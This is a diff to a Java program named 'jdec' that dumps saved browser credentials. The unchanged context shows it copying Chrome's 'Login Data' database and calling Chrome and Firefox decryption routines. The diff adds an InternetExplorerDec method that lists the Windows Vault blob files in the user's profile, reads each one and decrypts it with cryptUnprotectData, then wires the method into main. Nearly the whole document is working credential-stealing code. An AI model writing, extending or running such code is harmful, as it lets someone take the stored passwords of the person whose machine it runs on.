@@ -16,7 +16,9 @@ import java.io.OutputStream;
 import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.PrintStream;
-
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 // SQLite libraries
 import java.sql.DriverManager;
 import java.sql.Connection;
@@ -39,8 +41,7 @@ public class jdec extends Crypt32Util {
 		
 		// Get username
 		String user = System.getProperty("user.name");
-		
-		// Chrome
+
 		File chrome = FileUtils.getFile("C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
 		File chromedest = FileUtils.getFile("logindata.db");
 		FileUtils.copyFile(chrome, chromedest);
@@ -210,6 +211,41 @@ public class jdec extends Crypt32Util {
 		
 	}
 	
+	public static void InternetExplorerDec() throws IOException{
+		
+		// Get username
+		String user = System.getProperty("user.name");
+		
+		File ie = new File("C:\\Users\\" + user + "\\AppData\\Local\\Microsoft\\Vault\\");
+		String[] iedirlist = ie.list();
+		String iedir = iedirlist[0];
+		File ieblobfolder = new File("C:\\Users\\" + user + "\\AppData\\Local\\Microsoft\\Vault\\" + iedir + "\\");
+		String[] iebloblist = ieblobfolder.list();
+		ArrayList<String> bloblist = new ArrayList<String>();
+		// Remove files we don't need
+		for(String x : iebloblist){ if(!x.contains("vpol") && !x.contains("vsch")){ bloblist.add(x); } }
+		String[] newbloblist = bloblist.toArray(new String[bloblist.size()]);
+		
+		// Get paths for BLOBS and dec data array
+		Path[] blobpaths = new Path[newbloblist.length];
+		byte[][] blobdata = new byte[blobpaths.length][1024]; // Most blobs seem to be < 1KB
+		
+		// Put blobs into Java byte array
+		for(int j = 0; j < blobpaths.length; j++){
+		blobpaths[j] = Paths.get(ieblobfolder.getAbsolutePath().toString() + "\\" + newbloblist[j]);
+		blobdata[j] = Files.readAllBytes(blobpaths[j]);
+		}
+		
+		// Array for unencrypted bytes
+		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
+		
+		for(byte[] x : blobdata){
+			unencrypted.add(cryptUnprotectData(x, 0));
+		}
+
+		
+	}
+	
 	private static BufferedReader getOutput(Process p) {
 	    return new BufferedReader(new InputStreamReader(p.getInputStream()));
 	}
@@ -227,6 +263,7 @@ public class jdec extends Crypt32Util {
 		
 		ChromeDec();
 		FirefoxDec();
+		InternetExplorerDec();
 		System.out.println("Done");
 	}
 }
